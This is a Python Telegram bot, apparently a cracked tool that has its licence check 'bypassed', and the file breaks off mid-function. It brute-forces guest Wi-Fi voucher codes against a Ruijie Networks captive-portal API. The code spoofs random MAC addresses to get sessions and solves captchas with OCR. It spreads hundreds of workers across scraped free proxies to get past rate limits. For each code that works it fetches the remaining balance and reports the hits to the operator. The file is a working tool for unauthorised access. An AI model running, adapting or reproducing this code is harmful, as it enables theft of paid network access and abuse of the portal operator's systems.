#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  ⚡ Starlink Scanner Control Panel ⚡
  By Telegram @Codehack6xx
"""

import asyncio
import aiohttp
import json
import time
import random
import re
import os
import sys
import hashlib
import datetime
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr
import base64

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

try:
    from aiohttp_socks import ProxyConnector
except ImportError:
    ProxyConnector = None

# ═══════════════════════════════════════════════════════════════
#  🎨 DESIGN
# ═══════════════════════════════════════════════════════════════
OWNER = "@Codehack6xx"
BOT_TAGLINE = f"Thank for using By Telegram {OWNER}"
DIV = "━━━━━━━━━━━━━━━━━━━━━━"

# ═══════════════════════════════════════════════════════════════
#  🔐 CONFIG (Key Bypass)
# ═══════════════════════════════════════════════════════════════
CONFIG_FILE = "config.enc"
CONFIG_KEY = "S3cRetK3y#2024!@#Ruijie"


def xor_enc(data, key):
    kb = key.encode()
    out = bytearray()
    for i, b in enumerate(data.encode()):
        out.append(b ^ kb[i % len(kb)])
    return base64.b64encode(out).decode()


def xor_dec(enc, key):
    try:
        d = base64.b64decode(enc.encode())
        kb = key.encode()
        out = bytearray()
        for i, b in enumerate(d):
            out.append(b ^ kb[i % len(kb)])
        return out.decode()
    except Exception:
        return ""


def load_config():
    global SYSTEM_KEY, ADMIN_IDS
    SYSTEM_KEY = "BYPASSED"
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                dec = xor_dec(f.read().strip(), CONFIG_KEY)
            if dec:
                cfg = json.loads(dec)
                if "admin_ids" in cfg:
                    ADMIN_IDS = cfg["admin_ids"]
                    return
        except Exception:
            pass

    print("=" * 50)
    print("  First Run Setup (No Key Required)")
    print("=" * 50)
    admin_ids_input = input("TG ID: ").strip()
    admin_ids = [int(x.strip()) for x in admin_ids_input.split(",") if x.strip()]

    cfg = {"system_key": SYSTEM_KEY, "admin_ids": admin_ids}
    with open(CONFIG_FILE, "w") as f:
        f.write(xor_enc(json.dumps(cfg), CONFIG_KEY))

    ADMIN_IDS = admin_ids
    print("Configuration saved to config.enc")
    print("=" * 50)


SYSTEM_KEY = "BYPASSED"
ADMIN_IDS = []
load_config()

# ═══════════════════════════════════════════════════════════════
#  🎨 TERMINAL
# ═══════════════════════════════════════════════════════════════
RESET = "\033[0m"; CYAN = "\033[96m"; MAGENTA = "\033[95m"
GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"; BOLD = "\033[1m"
LAST_RUN_FILE = "last_run.txt"


def show_banner():
    try:
        os.system("clear" if os.name == "posix" else "cls")
    except Exception:
        pass
    print(f"{CYAN}{BOLD}")
    print("⚡════════════════════════════════════════⚡")
    print(f"{MAGENTA}     ⚡  STARLINK SCANNER  ⚡")
    print(f"{YELLOW}      By Telegram {OWNER}")
    print(f"{MAGENTA}   {BOT_TAGLINE}")
    print(f"{CYAN}⚡════════════════════════════════════════⚡{RESET}")


def check_time():
    now = datetime.datetime.now()
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE) as f:
                last = datetime.datetime.strptime(f.read().strip(), "%Y-%m-%d %H:%M:%S")
            if now < last:
                print(f"\n{RED}[!] TIME ROLLBACK DETECTED{RESET}")
                os._exit(0)
        except Exception:
            pass
    try:
        with open(LAST_RUN_FILE, "w") as f:
            f.write(now.strftime("%Y-%m-%d %H:%M:%S"))
    except Exception:
        pass


def check_approval():
    check_time()
    show_banner()
    expiry = datetime.datetime.strptime("2099-12-31 23:59:59", "%Y-%m-%d %H:%M:%S")
    remaining = expiry - datetime.datetime.now()
    d = remaining.days
    h, rem = divmod(remaining.seconds, 3600)
    m, _ = divmod(rem, 60)
    print(f"{GREEN}  🔐 Key       ➜ ✅ Authorized (No Key Needed){RESET}")
    print(f"{YELLOW}  ⏰ Expires   ➜ {expiry.strftime('%Y-%m-%d %H:%M')}{RESET}")
    print(f"{CYAN}  💎 Time left ➜ {d}d {h}h {m}m{RESET}")
    print(f"{CYAN}⚡════════════════════════════════════════⚡{RESET}")
    time.sleep(1.0)


# ═══════════════════════════════════════════════════════════════
#  🌐 WEB SERVER
# ═══════════════════════════════════════════════════════════════
def run_web():
    port = int(os.environ.get("PORT", 8080))

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bot is alive")

        def log_message(self, *a):
            pass

    try:
        HTTPServer(("0.0.0.0", port), H).serve_forever()
    except Exception as e:
        print(f"[WebServer] {e}")


def start_web():
    threading.Thread(target=run_web, daemon=True).start()


# ═══════════════════════════════════════════════════════════════
#  ⚙️ CONFIG
# ═══════════════════════════════════════════════════════════════
TIMEOUT_SEC = 20
MAX_CODES_PER_SID = 60
MAX_CODES_PER_SESSION = 60
NUM_WORKERS = 800
MANUAL_CONCURRENCY = 15
RETRY_CONCURRENCY = 30
BALANCE_WORKERS = 30

TOKEN_FILE = "bot_token.txt"
PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
    "https://proxylist.geonode.com/api/proxy-list?protocols=http&page=1&limit=500&sort_by=responseTime&sort_type=asc",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]


def get_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE) as f:
            t = f.read().strip()
            if t:
                return t
    t = input("🔥 Bot Token: ").strip()
    if not t:
        sys.exit(1)
    with open(TOKEN_FILE, "w") as f:
        f.write(t)
    return t


# ═══════════════════════════════════════════════════════════════
#  🕷️ PROXY MANAGER
# ═══════════════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.good_proxies = []
        self.index = 0
        self.good_index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy):
        proxy = proxy.strip()
        if not proxy:
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "http://" + proxy
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path) as f:
                    raw = [line.strip() for line in f if line.strip()]
                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
            except Exception as e:
                print(f"[ProxyManager] Load error: {e}")
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.index = 0

    def reload(self):
        self.load()

    def clear_file(self):
        try:
            with open(self.file_path, "w") as f:
                f.write("")
        except Exception:
            pass
        self.proxies = []
        self.bad_proxies.clear()
        self.good_proxies.clear()
        self.index = 0

    def add_proxies(self, new_proxies):
        normalized = [self._normalize(p) for p in new_proxies if p.strip()]
        normalized = [p for p in normalized if p]
        existing = set(self.proxies)
        added = []
        for p in normalized:
            if p not in existing:
                added.append(p)
                existing.add(p)
        if added:
            try:
                with open(self.file_path, "a") as f:
                    for p in added:
                        f.write(p + "\n")
            except Exception as e:
                print(f"[ProxyManager] Append error: {e}")
        self.reload()
        return len(added)

    def mark_good(self, proxy):
        if proxy and proxy not in self.good_proxies:
            self.good_proxies.append(proxy)

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            if self.good_proxies and random.random() < 0.8:
                proxy = self.good_proxies[self.good_index % len(self.good_proxies)]
                self.good_index += 1
                return proxy
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            proxy = available[self.index % len(available)]
            self.index += 1
            return proxy

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)
            if proxy in self.good_proxies:
                try:
                    self.good_proxies.remove(proxy)
                except ValueError:
                    pass

    def stats(self):
        total = len(self.proxies)
        bad = len(self.bad_proxies)
        return total, total - bad


_pm = None


def get_proxy_manager():
    global _pm
    if _pm is None:
        _pm = ProxyManager(PROXY_FILE)
    return _pm


def create_connector_for_proxy(proxy):
    return ProxyConnector.from_url(proxy, ssl=False)


# ═══════════════════════════════════════════════════════════════
#  🔍 OCR
# ═══════════════════════════════════════════════════════════════
_ocr_instance = None
_ocr_lock = threading.Lock()


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        with _ocr_lock:
            if _ocr_instance is None:
                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


# ═══════════════════════════════════════════════════════════════
#  👤 USER DATA
# ═══════════════════════════════════════════════════════════════
user_scanners = {}
user_proxy_checks = {}


def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file) as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            "mode": "num7",
            "char_set": "012345678",
            "code_len": 7,
            "start_digit": None,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None,
            "stats": {"tried": 0, "hits": 0, "expired": 0, "limits": 0, "start_time": time.time()},
            "valid_codes": [],
            "limit_codes": [],
            "tried_codes": set(),
            "recent_logs": [],
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": None,
            "num_workers": NUM_WORKERS,
            "balance_queue": asyncio.Queue(),
        }
    return user_scanners[user_id]


# ═══════════════════════════════════════════════════════════════
#  🔧 UTILITIES
# ═══════════════════════════════════════════════════════════════
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def ocr_image_bytes_fast(image_bytes):
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""


async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False, timeout=5) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None


async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return None, None
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query["mac"] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(spoofed_url, headers=headers, timeout=10, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=10, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get("sessionId", parsed_query.get("sid", [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None


# ═══════════════════════════════════════════════════════════════
#  💰 BALANCE
# ═══════════════════════════════════════════════════════════════
async def fetch_balance_with_proxy(active_token, proxy, timeout=3):
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(url, headers=headers, timeout=timeout) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get("result", data)
                    if not isinstance(inner, dict):
                        return False, "unexpected format"
                    profile_name = inner.get("profileName", "N/A")
                    raw_total = inner.get("totalMinutes", 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"👤 : {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"{type(e).__name__}"
    return False, "unknown"


async def fetch_balance_direct(active_token, timeout=5):
    url = f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get("result", data)
                    if not isinstance(inner, dict):
                        return False, "unexpected format"
                    profile_name = inner.get("profileName", "N/A")
                    raw_total = inner.get("totalMinutes", 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except Exception:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"👤 : {profile_name}, ⏰: {hours} hr {minutes} min"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"Net/Other: {type(e).__name__}"
    return False, "unknown"


async def fetch_balance_fast(active_token, preferred_proxy=None):
    pm = get_proxy_manager()
    if preferred_proxy:
        ok, result = await fetch_balance_with_proxy(active_token, preferred_proxy, timeout=3)
        if ok:
            pm.mark_good(preferred_proxy)
            return (result, "proxy")
        if result in ("ClientConnectorError", "ServerTimeoutError",
                      "ClientOSError", "ConnectionResetError",
                      "TimeoutError", "ClientProxyConnectionError",
                      "ServerDisconnectedError", "ClientConnectionError"):
            await pm.mark_bad(preferred_proxy)

    if pm.good_proxies:
        for proxy in random.sample(pm.good_proxies, min(1, len(pm.good_proxies))):
            if proxy == preferred_proxy:
                continue
            ok, result = await fetch_balance_with_proxy(active_token, proxy, timeout=3)
            if ok:
                pm.mark_good(proxy)
                return (result, "proxy")

    ok, result = await fetch_balance_direct(active_token, timeout=5)
    return (result if ok else f"❌ {result}", "direct")


# ═══════════════════════════════════════════════════════════════
#  💰 BALANCE WORKER
# ═══════════════════════════════════════════════════════════════
async def balance_worker(user_id, worker_id):
    ud = get_user_data(user_id)
    while not ud["stop_event"].is_set():
        try:
            try:
                active_token, code, proxy_str = await asyncio.wait_for(
                    ud["balance_queue"].get(), timeout=1.0
                )
            except asyncio.TimeoutError:
                continue

            if ud["stop_event"].is_set():
                break

            try:
                balance_str, source = await fetch_balance_fast(active_token, preferred_proxy=proxy_str)
            except Exception as e:
                balance_str = f"❌ {type(e).__name__}"
                source = "❌"

            for item in ud["valid_codes"]:
                if item["code"] == code:
                    item["balance_str"] = balance_str
                    item["source"] = source
                    break
            ud["dash_update_event"].set()
            ud["balance_queue"].task_done()
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.1)


# ═══════════════════════════════════════════════════════════════
#  ✅ CHECK SINGLE CODE
# ═══════════════════════════════════════════════════════════════
async def check_single_access_code(session, code, current_session_id, login_url,
                                   captcha_base_url, verify_url, headers, user_id, current_proxy):
    ud = get_user_data(user_id)
    if ud["stop_event"].is_set():
        return "failed"

    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    for _ in range(2):
        if ud["stop_event"].is_set():
            return "failed"
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            continue
        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(verify_url, json=v_payload, headers=headers, ssl=False, timeout=8) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue
                l_payload = {"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}
                async with session.post(login_url, json=l_payload, headers=headers, ssl=False, timeout=10) as l_resp:
                    ud["stats"]["tried"] += 1
                    l_text = (await l_resp.text()).lower()
                    if "request limited" in l_text:
                        return "limit"
                    if '"success":true' in l_text:
                        ud["stats"]["hits"] += 1
                        pm = get_proxy_manager()
                        pm.mark_good(current_proxy)
                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        active_token = token_match.group(1) if token_match else None
                        entry = {
                            "code": code,
                            "balance_str": "⏳ fetching...",
                            "source": "⏳",
                            "active_token": active_token,
                        }
                        if not any(item["code"] == code for item in ud["valid_codes"]):
                            ud["valid_codes"].append(entry)
                        ud["dash_update_event"].set()
                        if active_token:
                            await ud["balance_queue"].put((active_token, code, current_proxy))
                        else:
                            entry["balance_str"] = "❌ no token"
                            entry["source"] = "❌"
                            ud["dash_update_event"].set()
                        return "hit"
                    elif "expired" in l_text:
                        ud["stats"]["expired"] += 1
                        return "expired"
                    elif "the number of sta exceeds the limit" in l_text or "limit" in l_text:
                        ud["stats"]["limits"] += 1
                        if code not in ud["limit_codes"]:
                            ud["limit_codes"].append(code)
                        ud["recent_logs"].append(f"⚠️ LIMIT: {code}")
                        return "limit"
                    return "failed"
        except Exception:
            return "failed"
    return "failed"


# ═══════════════════════════════════════════════════════════════
#  👷 WORKER
# ═══════════════════════════════════════════════════════════════
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud["stop_event"].is_set():
        proxy = await pm.get_next()
        if proxy is None:
            await asyncio.sleep(1)
            continue
        proxy_connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(
            connector=proxy_connector,
            connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)
        ) as session:
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0
            sid_failures = 0
            while not ud["stop_event"].is_set() and codes_checked_this_session < MAX_CODES_PER_SESSION:
                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
                    sid, mac = await get_sid_from_gateway(session, ud["portal_url"], user_id)
                    if sid is None:
                        sid_failures += 1
                        if sid_failures >= 2:
                            await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(0.3)
                        continue
                    current_session_id = sid
                    codes_checked_this_sid = 0
                    sid_failures = 0
                code = None
                for _ in range(10):
                    if ud["mode"] == "custom" and ud["start_digit"] is not None:
                        body_chars = random.choices(ud["char_set"], k=ud["code_len"] - 1)
                        random.shuffle(body_chars)
                        code = ud["start_digit"] + "".join(body_chars)
                    else:
                        code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
                    if code not in ud["tried_codes"]:
                        ud["tried_codes"].add(code)
                        break
                if code is None or ud["stop_event"].is_set():
                    break
                ud["CURRENT_CODE"] = code
                result = await check_single_access_code(session, code, current_session_id,
                                                        login_url, captcha_base_url, verify_url,
                                                        headers, user_id, proxy)
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                if result == "limit":
                    current_session_id = None


# ═══════════════════════════════════════════════════════════════
#  📊 LIVE DASHBOARD (with Runtime)
# ═══════════════════════════════════════════════════════════════
async def live_dashboard_updater(context, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    last_tried = 0
    last_time = time.time()
    while not ud["stop_event"].is_set():
        if ud["dash_msg_id"] is None:
            await asyncio.sleep(0.3)
            continue
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0
            now = time.time()
            dt = now - last_time
            last_tried = stats["tried"]
            last_time = now
            proxy_total, proxy_active = pm.stats()

            h = int(elapsed) // 3600
            m = (int(elapsed) % 3600) // 60
            s = int(elapsed) % 60
            runtime = f"{h:02d}:{m:02d}:{s:02d}"

            hit_lines = []
            for item in ud["valid_codes"]:
                c = item["code"]
                balance = item.get("balance_str", "⏳ fetching...")
                hit_lines.append(f"{c}  {balance}")
            hit_str = "\n".join(hit_lines) if hit_lines else "None yet"

            text = (
                f"⚡ Scanner Running ⚡\n"
                f"{BOT_TAGLINE}\n"
                f"{DIV}\n"
                f"⏱️ Runtime ➜ {runtime}\n"
                f"🏹 Tried: {stats['tried']:,}\n"
                f"🎯 Current Code: {ud['CURRENT_CODE']}\n"
                f"🔥 Hits: {stats['hits']}\n"
                f"⚔️ Expired: {stats['expired']}\n"
                f"⚠️ Limits: {stats['limits']}\n"
                f"⚡ Speed: {speed_cpm:.1f} c/m\n"
                f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
                f"⚙️ Workers: {ud['num_workers']}\n"
                f"{DIV}\n"
                f"🔥 **Hit Codes**:\n"
                f"{hit_str}\n"
            )
            if ud["recent_logs"]:
                last_log = ud["recent_logs"][-1]
                text += f"{DIV}\n🔥 Last: {last_log}\n"

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🔴 Stop", callback_data="stop_scan")]
            ])
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud["dash_msg_id"],
                text=text,
                reply_markup=keyboard,
            )
        except Exception:
            pass
        try:
            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=5.0)
            ud["dash_update_event"].clear()
        except asyncio.TimeoutError:
            pass


# ═══════════════════════════════════════════════════════════════
#  🚀 START SCANNER
# ═══════════════════════════════════════════════════════════════
async def run_user_scanner(context, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    if proxy_total == 0:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"⚠️ No proxies loaded!\n\nPlease add proxies first.",
        )

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }

    ud["balance_queue"] = asyncio.Queue()
    ud["dash_update_event"].clear()
    tasks = [asyncio.create_task(live_dashboard_updater(context, user_id))]
    worker_count = ud.get("num_workers", NUM_WORKERS)
    for i in range(worker_count):
        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    for bw in range(BALANCE_WORKERS):
        tasks.append(asyncio.create_task(balance_worker(user_id, bw)))

    ud["task"] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            if not t.done():
                t.cancel()
        raise
    finally:
        stats = ud["stats"]
        elapsed = time.time() - stats["start_time"]
        speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0
        proxy_total, proxy_active = pm.stats()

        h = int(elapsed) // 3600
        m = (int(elapsed) % 3600) // 60
        s = int(elapsed) % 60
        runtime = f"{h:02d}:{m:02d}:{s:02d}"

        hit_lines = []
        for item in ud["valid_codes"]:
            c = item["code"]
            balance = item.get("balance_str", "N/A")
            hit_lines.append(f"{c}  {balance}")
        hit_str = "\n".join(hit_lines) if hit_lines else "None"

        final_text = (
            f"🛑 Scanner Stopped\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"⏱️ Runtime ➜ {runtime}\n"
            f"🏹 Total Tried: {stats['tried']:,}\n"
            f"🔥 Hits: {stats['hits']}\n"
            f"⚡ Speed: {speed_cpm:.1f} c/m\n"
            f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
            f"{DIV}\n"
            f"🎁 **Hit Codes**:\n{hit_str}\n"
            f"{DIV}\n"
            f"By Telegram {OWNER}"
        )
        if ud["dash_msg_id"]:
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=ud["dash_msg_id"],
                    text=final_text
                )
            except Exception:
                await context.bot.send_message(chat_id=user_id, text=final_text)
        else:
            await context.bot.send_message(chat_id=user_id, text=final_text)

        if ud["valid_codes"]:
            try:
                import datetime as _dt
                timestamp = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"hits_{user_id}_{timestamp}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f"=== HIT CODES REPORT ===\n")
                    f.write(f"Owner   : {OWNER}\n")
                    f.write(f"User ID : {user_id}\n")
                    f.write(f"Date    : {_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Runtime : {runtime}\n")
                    f.write(f"Tried   : {stats['tried']:,}\n")
                    f.write(f"Hits    : {stats['hits']}\n")
                    f.write(f"Speed   : {speed_cpm:.1f} c/m\n")
                    f.write(f"{'='*40}\n\n")
                    for item in ud["valid_codes"]:
                        f.write(f"{item['code']} | {item.get('balance_str', 'N/A')}\n")
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=user_id, document=f,
                        caption=f"🎁 Hit Codes Report\n"
                                f"✅ Total: {len(ud['valid_codes'])} hits\n"
                                f"By Telegram {OWNER}"
                    )
                try:
                    os.remove(filename)
                except Exception:
                    pass
            except Exception as e:
                print(f"[HitFile] Error: {e}")

        ud["stop_event"].clear()
        ud["dash_msg_id"] = None
        ud["task"] = None


# ═══════════════════════════════════════════════════════════════
#  🔍 PROXY CHECKER
# ═══════════════════════════════════════════════════════════════
async def fetch_proxy_list(url):
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get("content-type", "")
                    if "application/json" in content_type:
                        data = await resp.json()
                        items = None
                        if isinstance(data, list):
                            items = data
                        elif isinstance(data, dict):
                            for key in ("data", "items", "results"):
                                if key in data and isinstance(data[key], list):
                                    items = data[key]
                                    break
                        if items:
                            for item in items:
                                if isinstance(item, dict) and "ip" in item and "port" in item:
                                    ip = str(item["ip"]).strip()
                                    port = str(item["port"]).strip()
                                    if ip and port:
                                        proxies.append(f"http://{ip}:{port}")
                    else:
                        text = await resp.text()
                        for line in text.splitlines():
                            line = line.strip()
                            if line and not line.startswith("#"):
                                if not line.startswith(("http://", "https://")):
                                    line = "http://" + line
                                proxies.append(line)
    except Exception as e:
        print(f"Error fetching {url}: {e}")
    return proxies


async def check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id):
    async with semaphore:
        if stop_event.is_set():
            return None
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            u = urlparse(portal_url)
            query = parse_qs(u.query)
            mac = generate_random_mac()
            query["mac"] = [mac]
            spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
            async with session.get(spoofed_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as r2:
                body = await r2.text()
                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                if match:
                    final_url = urljoin(spoofed_url, match.group(1))
                    async with session.get(final_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as r3:
                        final_url = str(r3.url)
                else:
                    final_url = str(r2.url)
                parsed_query = parse_qs(urlparse(final_url).query)
                sid = parsed_query.get("sessionId", parsed_query.get("sid", [None]))[0]
                if sid:
                    return proxy
        except Exception:
            pass
        return None


async def run_proxy_check(context, chat_id, user_id, sources=None):
    stop_event = asyncio.Event()
    user_proxy_checks[user_id] = {"stop_event": stop_event, "msg_id": None, "task": asyncio.current_task()}
    if sources is None:
        sources = PROXY_SOURCES

    try:
        init_msg = await context.bot.send_message(
            chat_id,
            f"🔍 PROXY CHECKER 🔍\n"
            f"{BOT_TAGLINE}\n"
            f"{DIV}\n"
            f"⏳ Downloading proxy list...",
        )
    except Exception as e:
        print(f"[ProxyCheck] {e}")
        return
    progress_msg_id = init_msg.message_id

    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🛑 STOP & SAVE 🛑", callback_data="proxy_check_stop")]
    ])

    all_proxies = []
    for i, url in enumerate(sources, 1):
        if stop_event.is_set():
            break
        p = await fetch_proxy_list(url)
        all_proxies.extend(p)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text=(
                    f"🔍 PROXY CHECKER 🔍\n"
                    f"{BOT_TAGLINE}\n"
                    f"{DIV}\n"
                    f"📥 Downloading...\n"
                    f"🌐 Source: {i}/{len(sources)}\n"
                    f"📊 Current: {len(p)}\n"
                    f"🎯 Total: {len(all_proxies)}"
                ),
                reply_markup=stop_kb,
            )
        except Exception:
            pass

    seen = set()
    unique_proxies = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            unique_proxies.append(p)

    if not unique_proxies:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text="❌ No proxies found",
            )
        except Exception:
